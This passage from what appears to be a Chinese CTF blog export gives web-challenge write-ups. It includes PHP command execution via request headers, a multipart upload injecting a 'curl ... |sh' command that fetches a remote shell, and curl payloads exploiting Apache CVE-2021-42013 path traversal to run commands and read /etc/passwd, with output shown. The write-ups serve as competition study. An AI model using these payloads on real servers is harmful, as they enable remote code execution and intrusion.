class=\"keyword\">echo</span>(implode(apache_request_headers()));</span><br></pre></td></tr></table></figure>\n\n<p>apache_request_headers() 只有apache服务才能使用</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">传header</span><br><span class=\"line\"><span class=\"number\">111</span>:<span class=\"comment\">#;php.a898xx-gallff-7ckisj-ilkd8x tac;  //system这里是没有报错回显的，如果执行的命令太长会报错而无法返回，所以我们需要插入#将之后的长段命令注释掉</span></span><br><span class=\"line\">……</span><br><span class=\"line\">cmd=system(strrev(implode(apache_request_headers())));</span><br></pre></td></tr></table></figure>\n\n<p><strong>picture convert</strong></p>\n<p>wp来源：<a href=\"https://mp.weixin.qq.com/s/FGGceMvAZ9iRmIVIufBpBw\">2022年i春秋春季赛勇者赛道部分WP (qq.com)</a></p>\n<p>控制type 赋值session[‘filename’] 拼接RCE</p>\n<p><img src=\"/2022/05/10/i%E6%98%A5%E7%A7%8B5%E6%9C%88%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/640.png\" alt=\"640\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">----WebKitFormBoundary4aWxnEciPGAAwu2N</span><br><span class=\"line\">    Content-Disposition: </span><br><span class=\"line\">\tform-data; name=<span class=\"string\">&quot;type&quot;</span>;Content-Type: image/png</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;|| curl https://your-shell.com/ip:port |sh || &#x27;</span></span><br><span class=\"line\">------WebKitFormBoundary4aWxnEciPGAAwu2N</span><br><span class=\"line\">    Content-Disposition: form-data; name=<span class=\"string\">&quot;file&quot;</span>; </span><br><span class=\"line\">\tfilename=<span class=\"string\">&quot;1.png&quot;</span>Content-Type: image/png</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary4aWxnEciPGAAwu2N--</span><br></pre></td></tr></table></figure>","categories":["ctf比赛"],"tags":["一道web题也没做出来"]},{"title":"2022DASCTF出题人挑战赛","url":"/2022/05/22/2022DASCTF%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/","content":"<p>这个比赛web题目一半简单一般难，只把简单的做出来了</p>\n<span id=\"more\"></span>\n\n<h4 id=\"Power-Cookie\"><a href=\"#Power-Cookie\" class=\"headerlink\" title=\"Power Cookie\"></a>Power Cookie</h4><p>请求头增加Cookie: admin=1</p>\n<p>可以得到DASCTF{1f660431-f228-4817-aa1f-a51240be22f7}</p>\n<h4 id=\"魔法浏览器\"><a href=\"#魔法浏览器\" class=\"headerlink\" title=\"魔法浏览器\"></a>魔法浏览器</h4><p>javascript可以通过查看控制台可以看到请求头</p>\n<p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75</p>\n<p>添加到User-Agent:即可</p>\n<p>DASCTF{11ba6e5e-f248-4c55-8d82-36ffe9b0ff2a}</p>\n<h4 id=\"getme\"><a href=\"#getme\" class=\"headerlink\" title=\"getme\"></a>getme</h4><h5 id=\"Apache-HTTP-Server-2-4-50-中的路径遍历和文件泄露漏洞-（CVE-2021-42013）\"><a href=\"#Apache-HTTP-Server-2-4-50-中的路径遍历和文件泄露漏洞-（CVE-2021-42013）\" class=\"headerlink\" title=\"Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 （CVE-2021-42013）\"></a>Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 （CVE-2021-42013）</h5><h5 id=\"0x01漏洞概述\"><a href=\"#0x01漏洞概述\" class=\"headerlink\" title=\"0x01漏洞概述\"></a>0x01漏洞概述</h5><p>​    Apache HTTP Server项目是为包括UNIX和Windows在内的现代操作系统开发和维护开源HTTP服务器的努力。</p>\n<p>​    CVE-2021-42013是由CVE-2021-41773的不完整修复导致的漏洞，攻击者可以使用路径遍历攻击将URL映射到由类似Alias指令配置的目录之外的文件。</p>\n<hr>\n<h5 id=\"0x02影响版本\"><a href=\"#0x02影响版本\" class=\"headerlink\" title=\"0x02影响版本\"></a>0x02影响版本</h5><p>此漏洞影响 Apache HTTP Server 2.4.49 和 2.4.50，而不会影响更早版本。</p>\n<p>抓包可知Server: Apache/2.4.50 (Unix) </p>\n<p>源码提示</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--  pwd:/usr/local/apache2/ --&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload</span><br><span class=\"line\">curl -v --data <span class=\"string\">&quot;echo;id&quot;</span> <span class=\"string\">&#x27;http://靶机ip地址:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span></span><br><span class=\"line\">得到：</span><br><span class=\"line\">root:x:<span class=\"number\">0</span>:<span class=\"number\">0</span>:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:<span class=\"number\">1</span>:<span class=\"number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:<span class=\"number\">2</span>:<span class=\"number\">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:<span class=\"number\">3</span>:<span class=\"number\">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:<span class=\"number\">4</span>:<span class=\"number\">65534</span>:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:<span class=\"number\">5</span>:<span class=\"number\">60</span>:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:<span class=\"number\">6</span>:<span class=\"number\">12</span>:man:/<span class=\"keyword\">var</span>/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:<span class=\"number\">7</span>:<span class=\"number\">7</span>:lp:/<span class=\"keyword\">var</span>/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:<span class=\"number\">8</span>:<span class=\"number\">8</span>:mail:/<span class=\"keyword\">var</span>/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:<span class=\"number\">9</span>:<span class=\"number\">9</span>:news:/<span class=\"keyword\">var</span>/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:<span class=\"number\">10</span>:<span class=\"number\">10</span>:uucp:/<span class=\"keyword\">var</span>/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:<span class=\"number\">13</span>:<span class=\"number\">13</span>:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:<span class=\"number\">33</span>:<span class=\"number\">33</span>:www-data:/<span class=\"keyword\">var</span>/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:<span class=\"number\">34</span>:<span class=\"number\">34</span>:backup:/<span class=\"keyword\">var</span>/backups:/usr/sbin/nologin</span><br><span class=\"line\"><span class=\"keyword\">list</span>:x:<span class=\"number\">38</span>:<span class=\"number\">38</span>:Mailing <span class=\"keyword\">List</span> Manager:/<span class=\"keyword\">var</span>/<span class=\"keyword\">list</span>:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:<span class=\"number\">39</span>:<span class=\"number\">39</span>:ircd:/<span class=\"keyword\">var</span>/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:<span class=\"number\">41</span>:<span class=\"number\">41</span>:Gnats Bug-Reporting System (admin):/<span class=\"keyword\">var</span>/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:<span class=\"number\">65534</span>:<span class=\"number\">65534</span>:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:<span class=\"number\">100</span>:<span class=\"number\">65534</span>::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">* Connection <span class=\"comment\">#0 to host node4.buuoj.cn left intact</span></span><br><span class=\"line\">payload</span><br><span class=\"line\">curl -v --data <span class=\"string\">&quot;echo;cd /&amp;&amp;ls&quot;</span> <span class=\"string\">&#x27;http://node4.buuoj.cn:26856/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span> </span><br><span class=\"line\">得到</span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">diajgk<span class=\"comment\">//存在flag的文件夹</span></span><br><span class=\"line\">etc</span><br><span class=\"line\">flag<span class=\"comment\">//假的flag</span></span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\"><span class=\"keyword\">var</span></span><br><span class=\"line\">最终的payload</span><br><span class=\"line\">curl -v --data <span class=\"string\">&quot;echo;cat /diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg&quot;</span> <span class=\"string\">&#x27;http://node4.buuoj.cn:26856/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span> </span><br><span class=\"line\">即可得到flag    </span><br></pre></td></tr></table></figure>\n\n<p>复现</p>\n<h4 id=\"fxxkgo\"><a href=\"#fxxkgo\" class=\"headerlink\" title=\"fxxkgo\"></a>fxxkgo</h4><p>main.go内容</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>  &#123;</span><br><span class=\"line\">\tadmin := Account&#123;admin_id, admin_pw, <span class=\"literal\">true</span>, secret_key&#125;</span><br><span class=\"line\">\tacc = <span class=\"built_in\">append</span>(acc, admin)</span><br><span class=\"line\">\tr := gin.Default()</span><br><span class=\"line\">\tr.GET(<span class=\"string\">&quot;/&quot;</span>,index)</span><br><span class=\"line\">\tr.POST(<span class=\"string\">&quot;/&quot;</span>, rootHandler)</span><br><span class=\"line\">\tr.POST(<span class=\"string\">&quot;/flag&quot;</span>, flagHandler)</span><br><span class=\"line\">\tr.POST(<span class=\"string\">&quot;/auth&quot;</span>, authHandler)</span><br><span class=\"line\">\tr.POST(<span class=\"string\">&quot;/register&quot;</span>, Resist)</span><br><span class=\"line\">\tr.Run(<span class=\"string\">&quot;:80&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看见几个路由，跟踪代码，发现主要核心是在此处，存在一个模板渲染</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">rootHandler</span><span class=\"params\">(c *gin.Context)</span></span> &#123;</span><br><span class=\"line\">\ttoken := c.GetHeader(<span class=\"string\">&quot;X-Token&quot;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> token != <span class=\"string\">&quot;&quot;</span> &#123;</span><br><span class=\"line\">\t\tid, _ := jwt_decode(token)</span><br><span class=\"line\">\t\tacc := get_account(id)</span><br><span class=\"line\">\t\ttpl, err := template.New(<span class=\"string\">&quot;&quot;</span>).Parse(<span class=\"string\">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttpl.Execute(c.Writer, &amp;acc)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Dockerfile内容</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">FROM golang:<span class=\"number\">1.17</span></span><br><span class=\"line\"></span><br><span class=\"line\">WORKDIR /usr/src/app</span><br><span class=\"line\"></span><br><span class=\"line\">ENV GOPROXY https:<span class=\"comment\">//goproxy.cn,direct</span></span><br><span class=\"line\"></span><br><span class=\"line\">COPY <span class=\"keyword\">go</span>.mod .</span><br><span class=\"line\">RUN <span class=\"keyword\">go</span> mod download &amp;&amp; <span class=\"keyword\">go</span> mod verify</span><br><span class=\"line\"></span><br><span class=\"line\">COPY main.<span class=\"keyword\">go</span> .</span><br><span class=\"line\">COPY <span class=\"keyword\">go</span>.sum .</span><br><span class=\"line\">RUN <span class=\"keyword\">go</span> build -v -o /usr/local/bin/app ./...</span><br><span class=\"line\"></span><br><span class=\"line\">ENV KEY NOKEYFORYOU</span><br><span class=\"line\">ENV FLAG flag&#123;fake_flag&#125;</span><br><span class=\"line\">ENV AMDIN_ID admin</span><br><span class=\"line\">ENV AMDIN_PW NOPWDFORYOU</span><br><span class=\"line\"></span><br><span class=\"line\">CMD [<span class=\"string\">&quot;app&quot;</span>]</span><br></pre></td></tr></table></figure>\n\n","categories":["ctf比赛"],"tags":["Dasctf"]}]